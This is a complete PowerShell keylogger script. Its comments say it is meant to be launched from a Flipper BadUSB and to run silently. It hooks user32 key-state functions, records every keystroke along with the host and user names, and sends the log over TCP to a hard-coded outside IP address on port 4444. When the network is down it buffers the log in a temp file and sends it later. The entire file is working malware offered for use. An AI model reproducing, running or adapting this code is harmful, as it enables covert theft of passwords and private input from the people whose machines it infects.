# keylogger.ps1 - silent, re-run safe, TCP exfil 89.22.229.54:4444
# Loaded from GitHub raw by Flipper BadUSB. No host output.

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

# --- config ---
$ServerIP    = '89.22.229.54'
$ServerPort  = 4444
$ConnectMs   = 3000
$FlushEvery  = 24
$TimerMs     = 10000
$BufPath     = Join-Path $env:TEMP 'kl.buf'
$MaxBufBytes = 262144

function Send-Log {
    param([string]$Data)
    if ([string]::IsNullOrEmpty($Data)) { return $false }
    $client = $null
    $stream = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($ServerIP, $ServerPort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($ConnectMs, $false)) {
            try { $client.Close() } catch {}
            return $false
        }
        try { $client.EndConnect($iar) } catch { return $false }
        $stream = $client.GetStream()
        $stream.WriteTimeout = $ConnectMs
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        return $true
    } catch {
        return $false
    } finally {
        if ($stream) { try { $stream.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }
}

function Append-Local {
    param([string]$Data)
    try {
        $fi = Get-Item -LiteralPath $BufPath -ErrorAction SilentlyContinue
        if ($fi -and $fi.Length -gt $MaxBufBytes) {
            $tail = [IO.File]::ReadAllText($BufPath)
            if ($tail.Length -gt 8192) { $tail = $tail.Substring($tail.Length - 8192) }
            [IO.File]::WriteAllText($BufPath, $tail + $Data)
        } else {
            [IO.File]::AppendAllText($BufPath, $Data, [Text.Encoding]::UTF8)
        }
    } catch {}
}

function Flush-Queue {
    param([System.Text.StringBuilder]$Sb)
    if ($null -eq $Sb -or $Sb.Length -eq 0) { return }
    $chunk = $Sb.ToString()
    [void]$Sb.Clear()
    if (-not (Send-Log $chunk)) { Append-Local $chunk }
}

# Load Win32 API once — re-run must not throw "type already exists"
$API = $null
try { $API = [FlipperKL.KLApi] } catch { $API = $null }
if ($null -eq $API) {
    $cs = @'
using System.Runtime.InteropServices;
namespace FlipperKL {
  public static class KLApi {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
  }
}
'@
    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop | Out-Null } catch {}
    try { $API = [FlipperKL.KLApi] } catch { $API = $null }
}
if ($null -eq $API) { exit 0 }

function Map-Key([int]$vk) {
    switch ($vk) {
        0x08 { return '[BS]' }
        0x09 { return '[TAB]' }
        0x0D { return "[ENT]`n" }
        0x1B { return '[ESC]' }
        0x20 { return ' ' }
        0x2E { return '[DEL]' }
        0x25 { return '[LEFT]' }
        0x26 { return '[UP]' }
        0x27 { return '[RIGHT]' }
        0x28 { return '[DOWN]' }
        0x14 { return '[CAPS]' }
        0x5B { return '[WIN]' }
        0x5C { return '[WIN]' }
        0x10 { return '' }
        0xA0 { return '' }
        0xA1 { return '' }
        0x11 { return '[CTRL]' }
        0xA2 { return '[CTRL]' }
        0xA3 { return '[CTRL]' }
        0x12 { return '[ALT]' }
        0xA4 { return '[ALT]' }
        0xA5 { return '[ALT]' }
    }
    $shift = ($API::GetKeyState(0x10) -band 0x8000) -ne 0
    if ($vk -ge 0x30 -and $vk -le 0x39) {
        if (-not $shift) { return [string][char]$vk }
        return ')!@#$%^&*('.Substring($vk - 0x30, 1)
    }
    if ($vk -ge 0x41 -and $vk -le 0x5A) {
        $caps = ($API::GetKeyState(0x14) -band 0x0001) -ne 0
        $upper = $caps -xor $shift
        if ($upper) { return [string][char]$vk }
        return [string][char]($vk + 32)
    }
    switch ($vk) {
        0xBA { if ($shift) { return ':' } else { return ';' } }
        0xBB { if ($shift) { return '+' } else { return '=' } }
        0xBC { if ($shift) { return '<' } else { return ',' } }
        0xBD { if ($shift) { return '_' } else { return '-' } }
        0xBE { if ($shift) { return '>' } else { return '.' } }
        0xBF { if ($shift) { return '?' } else { return '/' } }
        0xC0 { if ($shift) { return '~' } else { return '`' } }
        0xDB { if ($shift) { return '{' } else { return '[' } }
        0xDC { if ($shift) { return '|' } else { return '\' } }
        0xDD { if ($shift) { return '}' } else { return ']' } }
        0xDE { if ($shift) { return '"' } else { return "'" } }
    }
    if ($vk -ge 0x70 -and $vk -le 0x7B) { return ('[F' + ($vk - 0x6F) + ']') }
    return $null
}

$banner = "--- host=$env:COMPUTERNAME user=$env:USERNAME ts=$([DateTime]::UtcNow.ToString('o')) ---`n"
[void](Send-Log $banner)
Append-Local $banner

$sb = New-Object System.Text.StringBuilder 2048
$lastFlush = [Environment]::TickCount

while ($true) {
    try {
        for ($k = 8; $k -le 255; $k++) {
            $st = $API::GetAsyncKeyState($k)
            if (($st -band 0x0001) -eq 0) { continue }
            $ch = Map-Key $k
            if ($null -eq $ch -or $ch -eq '') { continue }
            [void]$sb.Append($ch)
            if ($sb.Length -ge $FlushEvery) {
                Flush-Queue $sb
                $lastFlush = [Environment]::TickCount
            }
        }
        $now = [Environment]::TickCount
        $delta = [int]($now - $lastFlush)
        if ($delta -lt 0) { $delta = $TimerMs }
        if ($delta -ge $TimerMs) {
            Flush-Queue $sb
            try {
                if (Test-Path -LiteralPath $BufPath) {
                    $offline = [IO.File]::ReadAllText($BufPath)
                    if ($offline.Length -gt 0 -and (Send-Log $offline)) {
                        Remove-Item -LiteralPath $BufPath -Force -ErrorAction SilentlyContinue
                    }
                }
            } catch {}
            $lastFlush = $now
        }
    } catch {}
    Start-Sleep -Milliseconds 8
}
